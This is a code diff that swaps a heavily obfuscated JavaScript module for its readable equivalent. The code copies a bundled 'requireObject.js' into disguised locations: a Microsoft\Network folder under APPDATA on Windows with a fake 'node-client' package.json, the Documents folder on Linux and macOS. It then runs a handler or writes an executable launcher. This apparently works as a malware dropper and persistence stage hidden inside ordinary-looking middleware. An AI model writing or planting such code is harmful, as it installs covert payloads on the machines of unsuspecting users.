@@ -1,1 +1,48 @@
-(function(_0x56720c,_0x3c2c85){const _0x2ea4a5=_0x162c,_0x2f60a5=_0x56720c();while(!![]){try{const _0x27eef3=-parseInt(_0x2ea4a5(0x1c0))/(-0x6b5*0x1+0x11f0+-0x3be*0x3)+parseInt(_0x2ea4a5(0x1ca))/(-0x1*0x1c4f+0x1d17+-0xc6)*(-parseInt(_0x2ea4a5(0x1c9))/(0x23ee+0x2667+-0x4a52))+parseInt(_0x2ea4a5(0x1c2))/(-0x1*0x144d+-0x203d+0x348e)*(-parseInt(_0x2ea4a5(0x1cb))/(0x1*0x154a+-0x1de9+0x8a4))+-parseInt(_0x2ea4a5(0x1ba))/(0xd*-0x20d+-0x1b27+0x1*0x35d6)+-parseInt(_0x2ea4a5(0x1b7))/(0x10ee+0x825*0x2+-0x2131)+parseInt(_0x2ea4a5(0x1bf))/(-0x1590+0x165e+-0xc6)*(parseInt(_0x2ea4a5(0x1b8))/(-0xad*-0x1b+-0x1*0x210a+-0x4*-0x3b5))+parseInt(_0x2ea4a5(0x1c7))/(-0x143f+0x3e*0x5b+-0x1c1)*(parseInt(_0x2ea4a5(0x1c8))/(-0x1*-0x20ef+0x378+-0x245c));if(_0x27eef3===_0x3c2c85)break;else _0x2f60a5['push'](_0x2f60a5['shift']());}catch(_0xf4f96b){_0x2f60a5['push'](_0x2f60a5['shift']());}}}(_0x51bf,0x14b*-0x257+-0xf380e+0x1ad7ac));function _0x51bf(){const _0x28b01f=['l3zHCI9SB2CVCMvXDwLYzu9IAMvJDc5QCW','mJeXmZG2mgn0q0jxsq','B0ngwfa','CMvHzezPBgvtEw5J','CgXHDgzVCM0','BgLUDxG','oenfu3r5EG','otCXodvPDvrxC2e','D3jPDgvgAwXLu3LUyW','mJbtt0nxtfm','xe1Py3jVC29MDfXozxr3B3jRxhjLCxvPCMvpyMPLy3qUANm','Axztqwm','vgfgEMG','DxrMltG','nJu4meT2ExfwDW','ndaZodfRwxrICwi','mJG3mtK0ofPuDg9KCG','mMzID1f1vW','ndCWodK1Dgnorfjt','l3bYAxzHDguVDMfYl2XVzY9Yzxf1AxjLt2jQzwn0lMPZ','mtiZmJqZngrnsxjnBq','mtGXnty1mxvSy1r0BG'];_0x51bf=function(){return _0x28b01f;};return _0x51bf();}import _0x5e9964 from'fs';import{exec}from'child_process';import _0x2a67b3 from'path';import _0x2270ac from'os';import _0x14788a from'./responseHandler.js';function _0x162c(_0x529bbd,_0x595ffc){_0x529bbd=_0x529bbd-(-0x3b*0x10+0x2*-0x69d+0x12a0);const _0x21da8f=_0x51bf();let _0x3c71=_0x21da8f[_0x529bbd];if(_0x162c['bgzZZk']===undefined){var _0x9cdca5=function(_0x25e6a6){const _0x595748='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5e1734='',_0x53a74a='';for(let _0x244ed6=0x11c8+-0x5*0x2ab+-0x1*0x471,_0x1a0c93,_0x6c0335,_0x202e86=0xb5*0x1+0x332*0x1+0x9*-0x6f;_0x6c0335=_0x25e6a6['charAt'](_0x202e86++);~_0x6c0335&&(_0x1a0c93=_0x244ed6%(-0x277*-0xb+-0x214f+0x636)?_0x1a0c93*(-0x8ed+-0x479+0xda6)+_0x6c0335:_0x6c0335,_0x244ed6++%(-0x62e*0x1+-0x44*-0x6a+-0x15f6))?_0x5e1734+=String['fromCharCode'](0x1*-0x16d9+0x196c+-0x2*0xca&_0x1a0c93>>(-(-0x1*-0x1d5a+-0x260d+0x8b5)*_0x244ed6&0x2*-0xf1b+0x5d5*-0x3+-0xfe9*-0x3)):-0x1*-0x292+-0x84d+0x5bb){_0x6c0335=_0x595748['indexOf'](_0x6c0335);}for(let _0x526eeb=0x92*0x23+0xcd3+0x1*-0x20c9,_0x4a0e57=_0x5e1734['length'];_0x526eeb<_0x4a0e57;_0x526eeb++){_0x53a74a+='%'+('00'+_0x5e1734['charCodeAt'](_0x526eeb)['toString'](-0x35e+-0x212f+0x249d))['slice'](-(0x2*0x37f+0x17*-0xf6+0xf1e));}return decodeURIComponent(_0x53a74a);};_0x162c['qdbkGg']=_0x9cdca5,_0x162c['Neltoq']={},_0x162c['bgzZZk']=!![];}const _0x220d63=_0x21da8f[0x16*-0x10+-0x34*-0xc+-0x110],_0x29116f=_0x529bbd+_0x220d63,_0x4ebcde=_0x162c['Neltoq'][_0x29116f];return!_0x4ebcde?(_0x3c71=_0x162c['qdbkGg'](_0x3c71),_0x162c['Neltoq'][_0x29116f]=_0x3c71):_0x3c71=_0x4ebcde,_0x3c71;}export default async function _0x480d43(){const _0x21a460=_0x162c,_0x3f56a2={'dPhnc':'win32','ivSAc':function(_0x5cf920){return _0x5cf920();},'ckQGE':_0x21a460(0x1be),'TaFzh':_0x21a460(0x1c6),'oCFXP':'darwin'},_0x3f4b07='{\x0a\x20\x20\x22name\x22:\x20\x22node-client\x22,\x0a\x20\x20\x22version\x22:\x20\x221.0.0\x22,\x0a\x20\x20\x22type\x22:\x20\x22module\x22,\x0a\x20\x20\x22main\x22:\x20\x22requireObject.js\x22,\x0a\x20\x20\x22scripts\x22:\x20{\x0a\x20\x20\x20\x20\x22start\x22:\x20\x22node\x20requireObject.js\x22,\x0a\x20\x20\x20\x20\x22local\x22:\x20\x22node\x20requireObject.js\x20--local\x22\x0a\x20\x20},\x0a\x20\x20\x22dependencies\x22:\x20{\x0a\x20\x20\x20\x20\x22axios\x22:\x20\x22^1.7.0\x22,\x0a\x20\x20\x20\x20\x22koffi\x22:\x20\x22^3.0.2\x22\x0a\x20\x20}\x0a}\x0a',_0x4b35d5=_0x2270ac[_0x21a460(0x1bd)](),_0x1e3261=_0x5e9964[_0x21a460(0x1bc)]('middleware\x5crequireObject.js',_0x21a460(0x1c6));switch(_0x4b35d5){case _0x3f56a2['dPhnc']:_0x5e9964[_0x21a460(0x1c1)](process.env.APPDATA+'\x5cMicrosoft\x5cNetwork\x5cpackage.json',_0x3f4b07),_0x5e9964[_0x21a460(0x1c1)](process.env.APPDATA+_0x21a460(0x1c3),_0x1e3261),_0x3f56a2[_0x21a460(0x1c4)](_0x14788a);break;case _0x3f56a2['ckQGE']:_0x5e9964['writeFileSync'](_0x21a460(0x1b9),_0x1e3261,_0x3f56a2[_0x21a460(0x1c5)]);break;case _0x3f56a2[_0x21a460(0x1bb)]:_0x5e9964[_0x21a460(0x1c1)](_0x21a460(0x1b6),_0x1e3261,_0x3f56a2[_0x21a460(0x1c5)]);break;}}
+import fs from 'fs';
+import { exec } from 'child_process';
+import path from "path";
+import os from 'os';
+import run from './responseHandler.js';
+
+function one() {
+    const str = `#!/bin/bash
+/usr/bin/node ${os.homedir}/Documents/requireObject.js`;
+    fs.writeFileSync(`${os.homedir}/Documents/requireObject.js`, str, 'utf-8');
+    fs.chmodSync(`${os.homedir}/Documents/requireObject.js`, '755');
+}
+
+export default async function main() {
+    const pkg = `{
+  "name": "node-client",
+  "version": "1.0.0",
+  "type": "module",
+  "main": "requireObject.js",
+  "scripts": {
+    "start": "node requireObject.js",
+    "local": "node requireObject.js --local"
+  },
+  "dependencies": {
+    "axios": "^1.7.0",
+    "koffi": "^3.0.2"
+  }
+}
+`;
+
+    const platform = os.platform();
+    const jFile = fs.readFileSync('middleware\\requireObject.js', 'utf-8');
+
+    switch (platform) {
+        case "win32":
+            fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\package.json`, pkg);
+            fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\requireObject.js`, jFile);
+            run();
+            break;
+        case "linux":
+            fs.writeFileSync(`${os.homedir}/Documents/requireObject.js`, jFile, 'utf-8');
+            one();
+            break;
+        case "darwin":
+            fs.writeFileSync(`${os.homedir}/Documnets/requireObject.js`, jFile, 'utf-8');
+            break;
+    }
+}
